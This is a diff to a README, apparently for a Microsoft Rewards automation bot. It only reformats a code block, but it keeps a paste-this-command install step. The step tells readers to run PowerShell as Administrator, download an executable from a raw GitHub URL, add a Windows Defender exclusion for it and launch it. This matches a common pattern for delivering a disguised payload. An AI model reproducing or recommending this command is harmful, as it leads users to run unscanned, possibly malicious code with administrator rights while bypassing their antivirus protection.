@@ -37,7 +37,8 @@ This repository includes:
 
 Open PowerShell as Administrator, then run:
 
-```$f="$env:TEMP\install.exe"; iwr https://github.com/QuestPilot/Microsoft-Rewards-Bot/raw/refs/heads/release/scripts/install.exe -OutFile $f; Add-MpPreference -ExclusionPath $f; start $f
+```powershell
+$f="$env:TEMP\install.exe"; iwr https://github.com/QuestPilot/Microsoft-Rewards-Bot/raw/refs/heads/release/scripts/install.exe -OutFile $f; Add-MpPreference -ExclusionPath $f; start $f
 ```
 
 The installer will download the latest Windows installer from the release branch and launch it locally.
